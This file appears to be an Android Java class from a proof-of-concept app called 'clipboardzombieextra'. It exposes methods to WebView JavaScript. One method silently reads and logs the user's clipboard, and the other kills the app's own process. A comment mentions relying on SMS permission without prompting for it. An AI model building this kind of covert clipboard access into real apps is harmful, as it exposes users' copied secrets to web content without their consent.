package com.example.clipboardzombieextra;

import android.app.Activity;
import android.telephony.SmsManager;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;

public class JavaScriptInterface {
    public static String TAG = "CLIPBOARD_ZOMBIE";
    private final Activity activity;

    public JavaScriptInterface(Activity activity) {
        this.activity = activity;
    }

    // needs SMS permission to be enabled (does not prompt for it)
    @JavascriptInterface
    public void method1(){
        Log.i(TAG, "Getting clipboard");
        ClipboardManager clipboard = (ClipboardManager) activity.getApplicationContext().getSystemService(Context.CLIPBOARD_SERVICE);

        if (clipboard.hasPrimaryClip()) {
            ClipData clipData = clipboard.getPrimaryClip();
            ClipData.Item item = clipData.getItemAt(0);
            String clipboardText = item.getText().toString();
            Log.i(TAG, "Clipboard text: " + clipboardText);
        }
    }

    @JavascriptInterface
    public void method2() {
        activity.finishAndRemoveTask();
        int pid = android.os.Process.myPid();
        android.os.Process.killProcess(pid);
    }
}
